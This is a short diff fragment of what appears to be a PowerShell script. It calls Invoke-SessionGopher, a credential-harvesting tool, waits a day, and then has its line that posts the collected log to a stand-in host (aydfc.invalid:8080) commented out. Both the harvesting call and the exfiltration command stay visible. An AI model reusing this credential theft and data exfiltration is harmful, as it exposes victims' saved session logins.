@@ -308,4 +308,4 @@ Invoke-SessionGopher
 
 Start-Sleep 86400
 
-Invoke-WebRequest -uri http://aydfc.invalid:8080 -Method Post -Body $global:log
+# Invoke-WebRequest -uri http://aydfc.invalid:8080 -Method Post -Body $global:log
